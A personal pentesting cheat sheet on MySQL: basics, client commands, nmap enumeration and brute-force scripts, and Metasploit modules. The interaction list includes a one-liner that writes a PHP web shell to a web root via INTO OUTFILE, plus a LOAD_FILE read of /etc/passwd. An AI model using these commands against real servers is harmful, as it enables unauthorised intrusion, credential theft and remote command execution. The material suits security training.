
### *What is MYSQL?
-------------------------------------

`MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the [SQL database language](https://www.w3schools.com/sql/sql_intro.asp). MySQL works according to the `client-server principle` and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension `.sql`, for example, like `wordpress.sql`.

### *MySQL Commands==
----------------------------------------------

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected database.                                                            |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |
*  [to learn more ABout MySQL Command](https://www.bytebase.com/blog/top-mysql-commands-with-examples/)
* [SQL database language](https://www.w3schools.com/sql/sql_intro.asp)

### *Default Configuration
---------------------------------------------------------

The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as `database administrator`, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for `software developers` but also `information security analysts`. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQ

* [to learn how to Configuration Mysql][https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-20-04]

### Enumerating within MySQL
-----------------------------------------
#### __Nmap

Usually, the MySQL server runs on `TCP port 3306`, and we can scan this port with `Nmap` to get more detailed information.
```
nmap --script mysql-info -p 3306 <target-ip>
nmap --script mysql-enum -p 3306 <target-ip>
nmap --script mysql-brute -p 3306 <target-ip>
nmap --script mysql-databases -p 3306 <target-ip>
nmap --script mysql-users -p 3306 <target-ip>
nmap --script mysql-* -p 3306 <target-ip>
```

##### __For exmple:

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
##### !!!! You should edit --script-args for your MYSQL Server !!!

* *Audits MySQL database server security configuration
```
nmap -p 3306 --script mysql-audit --script-args "mysql-audit.username='root', \
  mysql-audit.password='foobar',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.x.x
```

*  *Bruteforce accounts and password against a MySQL Server
```
nmap --script=mysql-brute --script-args userdb=users.txt,passdb=passwords.txt -p 3306 192.168.x.x
```

* *Attempts to list all databases on a MySQL server. (creds required)
```
nmap -sV --script=mysql-databases -p 3306 192.168.x.x
```

### Interaction with the server

- `mysql -u root -h 10.129.14.132`
    
- `mysql -u root -pP4SSw0rd -h 10.129.14.128`
    
- `show databases;` list databases
    
- `select version();` show the version
    
- `use <database>;` select a database
    
- `show tables;` list the tables
    
- `show columns from <table>;`
    
- `select * from <table>;`
    
- `select * from <table> where <column> = "<string>";` Example:`select host, unique_users from host_summary;`
    
- `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` write local files
    
- `select LOAD_FILE("/etc/passwd");` read local files

#### __Some of the enumeration actions require valid credentials

```
1. msf> use auxiliary/scanner/mysql/mysql_version
2. msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
3. msf> use auxiliary/scanner/mysql/mysql_hashdump #Need Credential
4. msf> use auxiliary/admin/mysql/mysql_enum #Need Credential
5. msf> use auxiliary/scanner/mysql/mysql_schemadump #Need Credential
6. msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Need Credential
```
